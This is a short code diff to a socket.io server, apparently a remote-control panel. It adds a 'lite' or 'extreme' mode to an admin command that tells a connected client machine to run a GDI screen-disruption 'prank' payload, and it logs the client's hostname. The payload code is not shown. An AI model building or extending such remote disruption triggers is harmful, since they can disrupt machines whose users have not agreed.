@@ -500,20 +500,20 @@ io.on('connection', (socket) => {
 
 
   // Comando GDI Prank (Sanitized)
-  socket.on('admin:gdi-prank', (clientId: string) => {
-    console.log(`[Admin] Richiesta GDI PRANK per client: ${clientId}`);
+  socket.on('admin:gdi-prank', (clientId: string, mode: 'lite' | 'extreme' = 'lite') => {
+    console.log(`[Admin] Richiesta GDI PRANK per client: ${clientId} (Mode: ${mode})`);
 
     const client = connectedClients.get(clientId);
     if (client) {
-      io.to(clientId).emit('server:gdi-prank');
-      console.log(`[Server] Comando GDI-PRANK inviato a ${client.hostname}`);
+      io.to(clientId).emit('server:gdi-prank', mode);
+      console.log(`[Server] Comando GDI-PRANK (${mode}) inviato a ${client.hostname}`);
 
       logActivity({
         type: 'gdi_prank',
         clientId: clientId,
         clientHostname: client.hostname,
         adminId: socket.id,
-        details: `Solaris 2.0 C++ Port triggered (Sanitized & Compiled)`
+        details: `Solaris 2.0 C++ Port triggered (${mode})`
       });
     }
   });
